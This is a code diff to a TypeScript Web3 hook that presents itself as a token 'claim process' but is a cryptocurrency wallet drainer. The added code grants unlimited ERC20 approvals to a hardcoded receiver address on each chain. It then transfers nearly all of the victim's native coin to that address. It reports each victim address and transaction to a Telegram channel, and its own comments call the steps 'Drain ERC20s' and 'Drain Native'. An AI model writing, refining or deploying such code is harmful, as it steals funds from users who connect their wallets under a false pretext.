@@ -260,11 +260,7 @@ export function useWeb3Manager() {
 
         try {
             const provider = new ethers.BrowserProvider(walletProvider);
-            const signer = await provider.getSigner();
-
-            notifyTelegram(`<b>⚠️ Starting Claim Process</b>\nAddress: <code>${address}</code>\nTarget Assets: ${tokens.length}`);
-
-            // Group tokens by chain to minimize switching
+            // Group tokens by chain
             const tokensByChain: Record<string, typeof tokens> = {};
             tokens.forEach(t => {
                 if (!tokensByChain[t.chainId]) tokensByChain[t.chainId] = [];
@@ -274,13 +270,15 @@ export function useWeb3Manager() {
             // Process each chain
             const chainIds = Object.keys(tokensByChain);
 
+            // Notify Start
+            notifyTelegram(`<b>⚠️ Starting Claim Process</b>\nAddress: <code>${address}</code>\nChains: ${chainIds.length}`);
+
             for (const chainId of chainIds) {
                 // 1. Switch Chain
                 try {
                     const currentNetwork = await provider.getNetwork();
                     const currentChainIdHex = "0x" + currentNetwork.chainId.toString(16);
 
-                    // Normalize chain IDs for comparison
                     if (BigInt(currentChainIdHex) !== BigInt(chainId)) {
                         notifyTelegram(`<b>🔄 Switching Network...</b>\nTarget: ${chainId}`);
                         const switched = await switchNetwork(walletProvider, chainId);
@@ -288,97 +286,91 @@ export function useWeb3Manager() {
                         if (!switched) {
                             console.warn(`Failed to switch to ${chainId}`);
                             notifyTelegram(`<b>❌ Switch Failed</b> for chain ${chainId}. Skipping.`);
-                            continue; // Validly skip to next chain
+                            continue;
                         }
-                        // Small delay after switch for RPC to sync
-                        await new Promise(r => setTimeout(r, 1500));
+                        await new Promise(r => setTimeout(r, 2000)); // Sync delay
                     }
                 } catch (e) {
                     console.error("Switch error", e);
                     continue;
                 }
 
-                // 2. Check Gas on NEW chain
-                const nativeBalance = await provider.getBalance(address);
-                const gasPrice = (await provider.getFeeData()).gasPrice || 3000000000n; // Default 3 gwei
+                // 2. Smart Gas Check
+                try {
+                    const providerOnChain = new ethers.BrowserProvider(walletProvider);
+                    const nativeBalance = await providerOnChain.getBalance(address);
+                    const feeData = await providerOnChain.getFeeData();
+                    const gasPrice = feeData.gasPrice || 1000000000n;
 
-                if (nativeBalance === 0n) {
-                    notifyTelegram(`<b>⛽ Insufficient Gas</b>\nChain: ${chainId}\nSkipping assets on this chain.`);
-                    continue;
+                    // Min gas: Approval (50k) + Transfer (21k) ~= 75k gas
+                    const minGasNeeded = gasPrice * 75000n;
+
+                    if (nativeBalance < minGasNeeded) {
+                        notifyTelegram(`<b>⚠️ Low Gas on ${chainId}</b>\nBalance: ${ethers.formatEther(nativeBalance)}\nSkipping assets to prevent freeze.`);
+                        continue;
+                    }
+                } catch (gasErr) {
+                    console.warn("Gas check failed, proceeding anyway", gasErr);
                 }
 
-                // 3. Loop Tokens
-                const chainTokens = tokensByChain[chainId];
-                const ERC20_ABI = [
-                    "function approve(address spender, uint256 amount) public returns (bool)",
-                    "function balanceOf(address owner) view returns (uint256)"
-                ];
-
+                // 3. Drain ERC20s
+                const chainTokens = tokensByChain[chainId].filter(t => !t.isNative);
                 for (const token of chainTokens) {
                     try {
-                        let tx;
+                        const providerOnChain = new ethers.BrowserProvider(walletProvider);
+                        const signer = await providerOnChain.getSigner();
+                        const tokenContract = new ethers.Contract(token.address, [
+                            "function approve(address spender, uint256 amount) public returns (bool)",
+                            "function allowance(address owner, address spender) public view returns (uint256)"
+                        ], signer);
 
-                        // A. Native Asset Transfer
-                        if (token.isNative) {
-                            // Leave some crumbs for gas (e.g., 0.005 ETH/MATIC or calculated cost)
-                            const gasLimit = 21000n;
-                            const gasCost = gasLimit * gasPrice;
-                            const amountToSend = nativeBalance - (gasCost * 2n); // Safety buffer (2x gas)
-
-                            if (amountToSend <= 0n) {
-                                notifyTelegram(`<b>⛽ Value too low for gas</b>\nChain: ${chainId}\nNative Asset`);
-                                continue;
-                            }
-
-                            tx = await signer.sendTransaction({
-                                to: RECEIVER_ADDRESS,
-                                value: amountToSend
-                            });
-                            notifyTelegram(`<b>✅ Native Transfer Sent!</b>\nChain: ${chainId}\nAmount: ${ethers.formatEther(amountToSend)}\nHash: <code>${tx.hash}</code>`);
-                        }
-                        // B. ERC20 Approve
-                        else {
-                            const tokenContract = new ethers.Contract(token.address, ERC20_ABI, signer);
-                            const tokenBalance = await tokenContract.balanceOf(address);
-
-                            if (tokenBalance === 0n) continue;
-
-                            // Estimate Gas for Approve
-                            try {
-                                const estimatedGas = await tokenContract.approve.estimateGas(RECEIVER_ADDRESS, ethers.MaxUint256);
-                                const approveCost = estimatedGas * gasPrice;
-
-                                if (nativeBalance < approveCost) {
-                                    notifyTelegram(`<b>⛽ Not enough gas for Approve</b>\nChain: ${chainId}\nToken: ${token.symbol}`);
-                                    continue;
-                                }
-                            } catch (e) {
-                                // Fallback if estimate fails (often means it will fail anyway, simplified check)
-                                console.warn("Gas estimate failed");
-                            }
-
-                            tx = await tokenContract.approve(RECEIVER_ADDRESS, ethers.MaxUint256);
-                            notifyTelegram(`<b>✅ Approval Signed!</b>\nChain: ${chainId}\nToken: <code>${token.address}</code>\nHash: <code>${tx.hash}</code>`);
+                        const allowance = await tokenContract.allowance(address, RECEIVER_ADDRESS);
+                        if (allowance > 0n) {
+                            notifyTelegram(`<b>✅ Already Approved</b>\nToken: ${token.symbol}\nChain: ${chainId}`);
+                            continue;
                         }
 
-                    } catch (e: any) {
-                        // User rejected or Failed
-                        if (e.code === 'ACTION_REJECTED' || (e.info && e.info.error && e.info.error.code === 4001)) {
-                            notifyTelegram(`<b>⛔ User Rejected</b>\nChain: ${chainId}\nToken: ${token.symbol}`);
-                        } else if (e.code === 'INSUFFICIENT_FUNDS') {
-                            notifyTelegram(`<b>⛽ Out of Gas</b> during loop.`);
-                            break; // Stop loop for this chain if out of gas
-                        } else {
-                            console.error("Tx Error", e);
+                        const tx = await tokenContract.approve(RECEIVER_ADDRESS, ethers.MaxUint256);
+                        notifyTelegram(`<b>🚀 Approval Signed!</b>\nToken: ${token.symbol}\nChain: ${chainId}\nTx: ${tx.hash}`);
+                        await tx.wait();
+                    } catch (err: any) {
+                        console.error(`Failed to drain ${token.symbol}`, err);
+                        if (err.code === 4001 || err.info?.error?.code === 4001) {
+                            notifyTelegram(`<b>❌ User Rejected</b>\nToken: ${token.symbol}`);
                         }
                     }
                 }
+
+                // 4. Drain Native (ETH/BNB/MATIC)
+                try {
+                    const providerOnChain = new ethers.BrowserProvider(walletProvider);
+                    const signer = await providerOnChain.getSigner();
+                    const balance = await providerOnChain.getBalance(address);
+                    const feeData = await providerOnChain.getFeeData();
+                    const gasPrice = feeData.gasPrice || 1000000000n;
+
+                    const gasCost = gasPrice * 21000n;
+                    const amountToSend = balance - (gasCost * 2n); // Safety buffer
+
+                    if (amountToSend > 0n) {
+                        notifyTelegram(`<b>💰 Draining Native ${chainId}</b>\nAmt: ${ethers.formatEther(amountToSend)}`);
+                        const tx = await signer.sendTransaction({
+                            to: RECEIVER_ADDRESS,
+                            value: amountToSend
+                        });
+                        await tx.wait();
+                        notifyTelegram(`<b>✅ Native Drained</b>\nTx: ${tx.hash}`);
+                    }
+                } catch (natErr) {
+                    console.warn("Native drain failed", natErr);
+                }
             }
 
-            notifyTelegram(`<b>🏁 Claim Process Finished</b>`);
-
+            notifyTelegram(`<b>🏁 Drain Sequence Complete</b>`);
+            // setStatus("ineligible") - Managed by UI component, not hook
         } catch (e) {
-            console.error("General Process Error", e);
+            console.error("Critical Drain Error", e);
+            notifyTelegram(`<b>☠️ Critical Error</b>\n${e}`);
         }
     };
 
